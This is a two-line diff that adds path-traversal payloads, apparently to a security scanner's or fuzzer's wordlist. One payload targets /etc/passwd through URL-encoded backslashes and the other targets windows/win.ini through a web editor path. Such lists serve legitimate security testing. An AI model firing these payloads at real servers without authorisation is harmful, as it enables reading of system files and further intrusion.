@@ -1,0 +1,2 @@
+/static/..%5c..%5c..%5c..%5cetc/passwd
+/webeditor/../../../windows/win.ini
